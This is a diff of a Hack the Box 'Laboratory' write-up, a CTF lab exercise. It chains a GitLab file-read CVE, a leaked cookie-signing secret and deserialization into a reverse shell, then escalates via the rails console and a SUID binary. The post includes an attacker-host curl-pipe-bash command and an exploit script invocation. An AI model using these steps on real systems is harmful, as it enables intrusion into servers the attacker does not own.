@@ -8,7 +8,7 @@ categories:
 cover: ./assets/2021-05-13-hack-the-box-laboratory/cover.png
 ---
 
-In this write-up, I'm going over Laboratory from Hack the Box, a fun and enjoyable machine that got labelled as an easy box. The whole challenge mainly revolves around two exploits in a GitLab instance that will give you a user shell on the box. Especially the second vulnerability is pretty exciting and shows the importance of keeping your application secrets safe. Lots of apps will serialize data and send it to the user in the form of a cookie. They do this to keep the app stateless, so they don't have to worry about keeping track of the whole session state themselves. That puts a lot of trust in the fact that the user can't modify this cookie because it got signed with a secret that the user doesn't have access to. However, if this secret is somehow leaked, like for example, in this case through an LFI, then as a malicious actor, you can send a custom payload and execute a deserialization attack. The first exploit will be to trigger the LFI, use the GitLab app secret to sign a payload to get a shell on the box. Then via a custom setuid binary with path file checking, we'll get access to the root account. With all that said, let's dive right in and start our enumeration.
+In this write-up, I'm going over Laboratory from Hack the Box, a fun and enjoyable machine that got labelled as an easy box. The whole challenge mainly revolves around two exploits in a GitLab instance that will give you a user shell on the box. Especially the second vulnerability is pretty exciting and shows the importance of keeping your application secrets safe. Many apps will serialize data and send it over to the user in the form of a cookie. They mainly do this to keep their app stateless. That way, they don't have to worry about keeping track of the whole session state themselves. But that puts a lot of trust in the fact that the user can't modify this cookie, which is often considered safe because it got signed with a secret unknown to the user. However, if this secret is somehow leaked, like for example, in this case through an LFI, then as a malicious actor, you can send a custom payload and execute a deserialization attack. The first exploit will trigger the LFI and use the GitLab app secret to sign a payload to get a shell on the box. Then via a custom setuid binary with path file checking, we'll get access to the root account. With all that said, let's dive right in and start our enumeration.
 
 ## Enumeration
 
@@ -56,11 +56,11 @@ $ sudo vim /etc/hosts
 10.10.10.216 laboratory.htb git.laboratory.htb
 ```
 
-Digging into `laboratory.htb`, we get presented with a fairly basic HTML page. The whole website seems to mostly contain static content. Other than a couple of possible users or usernames, there isn't much here.
+Digging into `laboratory.htb`, we get presented with a fairly basic HTML page. The whole website seems to mostly contain static content. Other than a couple of possible usernames, there isn't much here.
 
 ![Laboratory Website](./assets/2021-05-13-hack-the-box-laboratory/laboratory-website.png)
 
-Let's turn our focus to the other domain, `git.laboratory.htb`, as it turns out this seems to be a self-hosted instance of the GitLab Community Edition. GitLab is a fully open-source alternative to GitHub. It gives you access to a git repository manager, wiki, issue tracker, CI pipelines, etc. Basically giving an organization or individual access to all the tools required to enforce a healthy DevOps life cycle with a single application. The current tech stack is a mix of Go, Ruby on Rails and Vue.js. The instance is just open and allows us to register a new user ourselves. The only validation it has is that it checks that the email you use is from `laboratory.htb`. So let's create ourselves a user, something like:
+Let's turn our focus to the other domain, `git.laboratory.htb`, as it turns out this seems to be a self-hosted instance of the GitLab Community Edition. GitLab is a fully open-source alternative to GitHub. It gives you access to a git repository manager, wiki, issue tracker, CI pipelines, and much more. It basically gives an organization or individual access to all the tools required to enforce a healthy DevOps life cycle with a single application. The current tech stack is a mix of Go, Ruby on Rails and Vue.js. The instance is just open and allows us to register a new user for ourselves. The only validation it has is that it checks that the email you use is from `laboratory.htb`. So let's create ourselves a user, something like:
 
 - **Username**: yolo123
 - **Email**: yolo123@laboratory.htb
@@ -72,7 +72,7 @@ And we've got access to this GitLab instance. For this newly created user, this 
 
 ![GitLab Version](./assets/2021-05-13-hack-the-box-laboratory/gitlab-version.png)
 
-When looking around online for exploits for this particular GitLab version I bumped into [CVE-2020-10977](https://nvd.nist.gov/vuln/detail/CVE-2020-10977). It's an arbitrary file read exploit that allows reading any file present on the server. Especially this [HackerOne](https://hackerone.com/reports/827052) is really interesting. It's where the issue initially got reported and contains very detailed step by step instructions on how to exploit and get RCE.
+When looking around online for known exploits for this particular GitLab version I bumped into [CVE-2020-10977](https://nvd.nist.gov/vuln/detail/CVE-2020-10977). It's an arbitrary file read exploit that allows reading any file present on the server. Especially this [HackerOne](https://hackerone.com/reports/827052) is really interesting. It's where the issue initially got reported and contains very detailed step by step instructions on how to exploit and get RCE.
 
 ## Foothold
 
@@ -125,15 +125,15 @@ gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
 gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
 ```
 
-This file, in particular, isn't all too interesting, but there is this file `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` that contains the secret that GitLab uses to sign cookies. This is the crucial piece we need to transform our LFI exploit into an RCE.
+This file on its own isn't all too interesting. But doing a bit of research, you will learn that every GitLab instance will contain this file `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`, which has all the secrets required to start signing custom cookies. This is the crucial piece we need to transform our LFI exploit into an RCE.
 
-The HackerOne article contains a snippet of code that allows us to generate the serialized payload we can inject into the cookie. To create this payload, we'll need access to the GitLab Rails Console. The best way to get access to this Rails Console is via the GitLab docker image. This even allows us to run the exact same version as our target machine is running. To get a shell in the GitLab container, you can run:
+The HackerOne article contains a snippet of code that allows us to generate the serialized payload we can inject into the cookie. To create this payload, we'll need access to the GitLab Rails Console. The best way to get access to this console is via the GitLab docker image. This even allows us to run the exact same version as our target machine is running. To get a shell in the container, you can run:
 
 ```sh
 docker run -it gitlab/gitlab-ce:12.8.1-ce.0 bash
 ```
 
-This might take a while, so go grab a coffee. This local GitLab instance should be running in just a few. When the instance is up and running, use `docker ps` to find the id of the container. You can then use `docker exec -it <container-id> bash` to get a shell inside this container. Now let's replace the `secret_key_base` in `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` in our docker image with the secret we just leaked from our target machine. This will allow us to create a valid signed cookie with our reverse shell embedded. Before we can do this, restart GitLab with `gitlab-ctl restart`. When that is finish we can launch the rails console with `gitlab-rails console` and past in the following payload:
+This might take a while, so go grab a coffee, this local GitLab instance should be running in just a few. When the instance is up and running, use `docker ps` to find the id of the container. You can then use `docker exec -it <container-id> bash` to get a shell inside this container. Now let's replace the `secret_key_base` in `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` in our docker image with the secret we just leaked from our target machine. This will allow us to create a valid signed cookie with our reverse shell embedded within. Before we can do this, restart GitLab with `gitlab-ctl restart`. When that is finish we can launch the rails console with `gitlab-rails console` and paste in the following payload:
 
 ```ruby
 request = ActionDispatch::Request.new(Rails.application.env_config)
@@ -156,7 +156,7 @@ And we've got our reverse shell:
 
 ![Reverse Shell](./assets/2021-05-13-hack-the-box-laboratory/rev-shell.png)
 
-That's a lot of manual steps that you need to go through, given that the HackerOne report is very detailed and GitLab exposed a pretty rich API. So I decided to write up this exploit in Python, which I open-sourced via [this](https://github.com/nickvdyck/gitlab-cve-2020-10977) GitHub repository. The repository contains all the instructions to get up and running. But in short, you'll need to have `pipenv` installed on your path. This can be done via `pip install pipenv`. Then running `pipenv sync` will install all required dependencies in a virtual environment managed by pipenv. This allows you to kick of the LFI with:
+That's a lot of manual steps that you need to go through. Given that the HackerOne report is very detailed and GitLab exposed a pretty rich API, I decided to write up this exploit in Python. You can find the code in [this](https://github.com/nickvdyck/gitlab-cve-2020-10977) GitHub repository. The repository contains all the instructions to get up and running. But in short, you'll need to have `pipenv` installed on your path. This can be done via `pip install pipenv`. Then running `pipenv sync` will install all required dependencies in a virtual environment managed by pipenv. Allowing you to kick of the LFI with:
 
 ```sh
 pipenv run ./cve_2020_10977.py --url https://git.laboratory.htb -u yolo123 -p password --insecure
@@ -170,7 +170,7 @@ pipenv run ./cve_2020_10977.py --url https://git.laboratory.htb -u yolo123 -p pa
 
 ## Lateral Movement
 
-We got access to our target machine but at the moment we are not a privileged user and are currently logged in as the `git`user. But we can have access to the `gitlab-rails console` and there is [this](https://docs.gitlab.com/ee/security/reset_user_password.html) GitLab support article that explains how you can use the console to reset a users password. Let's use this same technique to give us admin permissions:
+We got access to our target machine but at the moment we are not a privileged user and are currently logged in as the `git`user. But just like in our container just earlier, we have access to the `gitlab-rails console`. There is [this](https://docs.gitlab.com/ee/security/reset_user_password.html) GitLab support article that explains how you can use the console to reset a users password. Let's use this same technique to give us admin permissions:
 
 ```sh
 git@git:~/gitlab-rails/working$ gitlab-rails console
@@ -192,7 +192,7 @@ irb(main):004:0> user.save!
 irb(main):005:0>
 ```
 
-Going back to our browser, we should now have access to the admin section. If you don't see the wrench icon give it a few seconds to propagate, GitLab caches certain parts quite heavily. On the admin dashboard, we do see 2 projects we now have access to. These projects are from the `Dexter` user, and if you snooped around the gitlab-rails console a bit, you might have noticed that this user is also an admin.
+Going back to our browser, we should now have access to the admin section. If you don't see the wrench icon give it a few seconds to propagate, GitLab caches certain parts quite heavily. On the admin dashboard, we see 2 projects we now have access to. These projects are from the `Dexter` user, and if you snooped around the gitlab-rails console a bit, you might have noticed that this user is also an admin.
 
 ![GitLab Admin Access](./assets/2021-05-13-hack-the-box-laboratory/gitlab-admin-access.png)
 
@@ -208,10 +208,9 @@ $ ssh -i id_rsa dexter@10.10.10.216
 dexter@laboratory:~$ ls
 user.txt
 dexter@laboratory:~$
-
 ```
 
-To do some reconnaissance, you can download `linpeas.sh` directly onto the box by hosting a webserver on your local machine with `python -m http.server`. Piping it directly into bash kicks off the scan instantly and doesn't leave any trace behind on the machine. Looking through the results, it shows an interesting SUID binary that isn't usually on a Linux system and that is owned by the `dexter` user. I truncated the result, but an SUID binary can be detected by the `s` within the file permissions of the output of an `ls` command. A SUID binary gets executed as the root user without asking for a password, meaning it is an exciting target for us to try and exploit.
+Let's run [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) on the machine to get an idea of where we need to focus our efforts next. Hack the box machine don't have internet access, so the best way to get this up and running is to download `linpeas.sh` on your host machine and expose it by hosting a webserver with `python -m http.server`. Then we can use curl to download the script and pipe it directly to bash to let it do its thing. The results show an interesting SUID binary that isn't usually on a Linux system, and the `dexter` user owns that. I truncated the output, but a SUID binary can be detected by the `s` within the file permissions of the output of an `ls` command. A SUID binary gets executed as the root user without asking for a password, meaning it is an exciting target for us to try and exploit.
 
 ```sh
 $ curl -L http://10.10.14.19:8000/linpeas.sh | bash
@@ -226,7 +225,7 @@ $ curl -L http://10.10.14.19:8000/linpeas.sh | bash
 <snip>
 ```
 
-Executing the binary with `docker-security` doesn't seem to be doing much. The `strings` command doesn't seem to be present on the machine, so let's use `ltrace` to figure out what is going on under the hood. Looking at the output it seems to be using the `system` function to execute a command from the path, `chmod` in this case.
+When running this binary, you'll notice that nothing really happened. There is also no output written to stdout, so it's pretty hard to know what it actually did. Let's see what this binary is doing under the hood by running it with `ltrace. ltrace is a program that simply runs the specified command until it exits. It intercepts and records the dynamic library calls which are called by the executed process and the signals which are received by that process. It can also intercept and print the system calls executed by the program, which is exactly what we need in this case. Looking at the output it seems to be using a system call to execute a command from the path:
 
 ```sh
 ltrace docker-security
@@ -243,7 +242,7 @@ system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/
 +++ exited (status 0) +++
 ```
 
-If you use `sudo` run a command with elevated permissions it has a concept of secure paths. Meaning it changes the `PATH` variable to make it harder to tamper with. The configuration of this is defined in the `/etc/sudoers` file and often includes the same known paths but prefixed with an s like `/sbin` or `/usr/sbin`.
+If you use `sudo` to run a command with elevated permissions it has a concept of secure paths. Meaning it changes the `PATH` variable to make it harder to tamper with. The configuration for this is defined in the `/etc/sudoers` file and often includes the same known paths but prefixed with an s like `/sbin` or `/usr/sbin`.
 
 ```sh
 Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin
